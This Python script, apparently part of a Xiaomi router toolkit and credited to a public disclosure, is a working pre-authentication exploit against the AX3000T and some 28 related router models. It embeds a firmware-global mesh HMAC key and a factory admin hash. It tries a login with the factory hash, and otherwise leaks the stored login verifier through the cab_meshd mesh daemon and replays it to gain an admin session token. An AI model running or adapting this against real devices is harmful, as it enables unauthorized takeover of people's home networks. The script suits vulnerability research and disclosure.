#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import hmac
import json
import random
import socket
import ssl
import struct
import sys
import time

import xmir_base
from gateway import *

# Devices:
# RD03v2  FW 2.0.28   Router AX3000T   (tested on hardware)
# The same key and daemon are present in 28 model codes (RD03 RD23 RD15 RD16 RD18
# RD08 RC06 RC01 RN02 RD05 RD01 RD02 RB01 RB03 RB04 RB06 RB08 RA67 RA69 RA70
# RA71 RA72 RA74 RA80 RA81 RA82 RM1800 R3600), ARM64/ARM32/MIPS32el.

web_password = False

try:
    gw = inited_gw
except NameError:
    gw = create_gateway(die_if_sshOk = False, web_login = web_password)


MESH_PORT = 19553
MESH_KEY = b"838d364d8ed3bd085e150211ea6b3715"
MESH_VER = 0x1001
MESH_HDR = 0x2c

# /etc/config/account "config core 'common'" -> option 'admin'. The value shipped
# in stock firmware, so it authenticates any unit on which no admin password has
# ever been set -- anything still on, or just past, the setup wizard.
FACTORY_ADMIN_HASH = "73a1d6d01003067844cd148b1502a24bb8a305c93dfef55f983da80fa8cdfa24"


def mesh_pass(ident):
    ######
    # vuln/exploit author: Adriel Santos
    # publication: https://github.com/ADCDS/xiaomi-ax3000t-cabmeshd-disclosure
    ######
    # The loader at 0x3bb0 overwrites byte 0 of the key with the role byte. A
    # server (CAP) verifies an INCOMING peer with 'q'; 'x' is what a CAP sends
    # for the auth it originates itself.
    return base64.b64encode(hmac.new(b'q' + MESH_KEY[1:], ident, hashlib.sha256).digest())


def mesh_hdr(typ, blen):
    h = bytearray(MESH_HDR)
    h[0:2] = struct.pack('>H', MESH_VER)
    h[2:4] = struct.pack('>H', blen)
    h[4:6] = struct.pack('>H', typ)
    return bytes(h)


def make_nonce(gw):
    # checkNonce wants exactly four fields, a type <= 4, and a time strictly
    # greater than the last one seen for this (type, mac) pair -- a live
    # timestamp satisfies the replay guard.
    return "0_{}_{}_{}".format(gw.mac_address, int(time.time()), random.randint(1000, 10000))


def web_login_with_hash(gw, stored_hash, timeout = 4, retry = False):
    """POST a login for an already-known stored verifier.

    Same request web_login() makes, minus the password: jsonauth checks
    sha256(nonce || <stored account value>), so holding the stored value is
    equivalent to holding the password.

    Returns (stok, None) on success, (None, reason) otherwise.
    """
    reason = 'no response'
    for attempt in range(2 if retry else 1):
        nonce = make_nonce(gw)
        password = gw.xqhash((nonce + stored_hash).encode('utf-8'))
        data = f"username=admin&password={password}&logtype=2&nonce={nonce}"
        text = gw.api_request('api/xqsystem/login', data, scheme = 'http',
                              post = 'x-www-form', resp = 'text', timeout = timeout)
        if not text or not text.startswith('{'):
            return None, f'login request failed (response: {text!r})'
        try:
            res = json.loads(text)
        except Exception:
            return None, f'login returned non-JSON ({text!r})'
        if res.get('token'):
            return res['token'], None
        reason = f'code={res.get("code")} msg={res.get("msg")!r}'
        # A nonce reused inside the same second trips the replay guard, so one
        # retry with a fresh (later) nonce is worth it -- but only when we know
        # the stored value is right.
        if retry and attempt == 0:
            time.sleep(1.1)
    return None, reason


def get_sync_config(ip_addr, ident = b'xmir0001', hold = 6.0, timeout = 20):
    """Drive cab_meshd to ST_RUNNING and return its type-6 sync config.

    The daemon authenticates the handshake with a firmware-global key and asks
    for no client certificate, so an unauthenticated peer reaches ST_RUNNING.
    The CAP then sends its own configuration, which carries the stored web
    login verifier.

    NOTE: the type-7 sync_reply is deliberately never sent. That is the frame
    which runs cap_init, so this function leaves the target's wifi
    configuration untouched.
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers('ALL:@SECLEVEL=0')
    except ssl.SSLError:
        pass

    # cab_meshd keeps a small pool of connection slots and only frees a stalled
    # one on its own timeout, so the first TLS handshake can time out.
    sock = None
    for attempt in range(4):
        try:
            sock = ctx.wrap_socket(socket.create_connection((ip_addr, MESH_PORT), timeout = timeout))
            break
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as e:
            if attempt == 3:
                raise ExploitNotWorked(
                    f'Cannot open TLS session to {ip_addr}:{MESH_PORT} ({type(e).__name__})')
            print(f'WARN: cab_meshd slot busy ({type(e).__name__}), retry {attempt + 2}/4')
            time.sleep(15)
    print(f'Connected to cab_meshd on port {MESH_PORT} ({sock.version()}, no client cert)')

    # type-4 auth_req: id at 0x00, pass at 0x10
    b4 = bytearray(0xa4)
    b4[0:len(ident)] = ident
    p = mesh_pass(ident)
    b4[0x10:0x10 + len(p)] = p
    sock.sendall(mesh_hdr(4, len(b4)) + bytes(b4))

    # type-5 auth_reply: body[0] = 1 advances the CAP to ST_RUNNING; it then
    # sends its sync config as a type-6 message.
    time.sleep(1.0)
    b5 = bytearray(0x20)
    b5[0] = 1
    sock.sendall(mesh_hdr(5, len(b5)) + bytes(b5))
    print('Mesh handshake accepted, waiting for the sync config ...')

    deadline = time.time() + hold
    buf = b''
    cfg = None
    sock.settimeout(1.0)
    while time.time() < deadline and cfg is None:
        try:
            chunk = sock.recv(4096)
        except (socket.timeout, ssl.SSLWantReadError):
            continue
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        while len(buf) >= MESH_HDR:
            _, blen, typ = struct.unpack('>HHH', buf[0:6])
            if len(buf) < MESH_HDR + blen:
                break
            body, buf = buf[MESH_HDR:MESH_HDR + blen], buf[MESH_HDR + blen:]
            if typ == 6:
                js, je = body.find(b'{'), body.rfind(b'}')
                if js != -1 and je > js:
                    cfg = body[js:je + 1]
    try:
        sock.close()
    except OSError:
        pass
    if cfg is None:
        raise ExploitNotWorked('No sync config received (is the device initialised?)')
    return json.loads(cfg)


def web_login_verifier(gw, cfg):
    """Pick the stored verifier matching this device's login hash mode."""
    if gw.encryptmode == 0:  # sha1
        return cfg.get('web_passwd') or cfg.get('web_passwd256')
    return cfg.get('web_passwd256') or cfg.get('web_passwd')


if gw.status < 1:
    die(f"Xiaomi Mi Wi-Fi device not found (IP: {gw.ip_addr})")

dn = gw.device_name
print(f"device_name = {dn}")
print(f"rom_version = {gw.rom_version} {gw.rom_channel}")
print(f"mac_address = {gw.mac_address}")
print(f"encryptmode = {gw.encryptmode} ({'sha256' if gw.encryptmode else 'sha1'})")

inited = None
try:
    info = gw.get_init_info(timeout = 5)
    if info:
        inited = info.get('inited')
        print(f"inited = {inited}")
except Exception:
    pass

stok = None

# --- path 1: the shipped factory account value -------------------------------
# Single attempt only: a wrong hash counts as a failed login, and repeating it
# is how an account gets temporarily banned.
print('')
print('Try 1: factory account value ...')
stok, why = web_login_with_hash(gw, FACTORY_ADMIN_HASH)
if stok:
    print('  factory account value accepted (no admin password has been set)')
else:
    print(f'  rejected ({why})')
    if inited == 1:
        print('  the unit is initialised, so an admin password is set -- '
              'trying the mesh path')

# --- path 2: leak the stored verifier over the mesh port ---------------------
if not stok:
    print('')
    print('Try 2: cab_meshd sync config ...')
    if inited == 0:
        print('  WARN: the unit is not initialised. cab_meshd only runs its CAP')
        print('        listener once setup is complete (its init script is')
        print('        START=99, boot only), so port 19553 does not exist yet.')
    try:
        cfg = get_sync_config(gw.ip_addr)
    except ExploitNotWorked as e:
        raise ExploitNotWorked(f'Exploit "pre-auth web_login" not working!!! ({e})')

    verifier = web_login_verifier(gw, cfg)
    if not verifier:
        raise ExploitNotWorked('Exploit "pre-auth web_login" not working!!! '
                               '(no stored verifier in the sync config)')
    print(f'  sync config fields = {sorted(cfg.keys())}')
    print(f'  leaked verifier = {verifier}')

    stok, why = web_login_with_hash(gw, verifier, retry = True)
    if not stok:
        raise ExploitNotWorked(f'Exploit "pre-auth web_login" not working!!! '
                               f'(login with the leaked verifier failed: {why})')

gw.stok = stok

print('')
print('#### Pre-auth admin session obtained! ####')
print(f'stok = {stok}')
print(f'Admin UI: http://{gw.ip_addr}/cgi-bin/luci/;stok={stok}/web/home')
